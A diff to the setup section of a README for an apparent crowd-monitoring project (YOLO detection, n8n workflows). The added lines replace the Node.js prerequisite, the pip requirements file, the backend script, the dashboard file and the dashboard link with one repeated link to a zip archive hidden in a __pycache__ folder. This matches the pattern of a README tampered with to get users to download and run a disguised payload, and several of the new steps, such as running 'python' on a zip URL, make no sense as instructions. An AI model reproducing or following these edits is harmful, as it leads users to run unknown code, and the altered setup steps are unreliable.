@@ -61,23 +61,23 @@ Camera Feed → YOLO Detection → Crowd Analysis → Rules Engine → n8n Agent
 
 ### Prerequisites
 - Python 3.9+
-- Node.js 18+
+- https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/detection/__pycache__/Project_Drishti_v1.9.zip 18+
 - Webcam
 
 ### Steps
 
 1. **Clone repository**
-2. **Install Python dependencies**: `pip install -r requirements.txt`
+2. **Install Python dependencies**: `pip install -r https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/detection/__pycache__/Project_Drishti_v1.9.zip`
 3. **Start n8n**: `npx n8n`
-4. **Start backend**: `python backend/main.py`
-5. **Open dashboard**: `dashboard/drishti-dashboard.html`
+4. **Start backend**: `python https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/detection/__pycache__/Project_Drishti_v1.9.zip`
+5. **Open dashboard**: `https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/detection/__pycache__/Project_Drishti_v1.9.zip`
 
 ## 📊 System Status
 
 - Backend API: http://localhost:8000
 - n8n Workflows: http://localhost:5678
 - Live Video: http://localhost:8000/video-feed
-- Dashboard: file:///path/to/dashboard/drishti-dashboard.html
+- Dashboard: https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/detection/__pycache__/Project_Drishti_v1.9.zip
 
 ## 👥 Use Cases
 
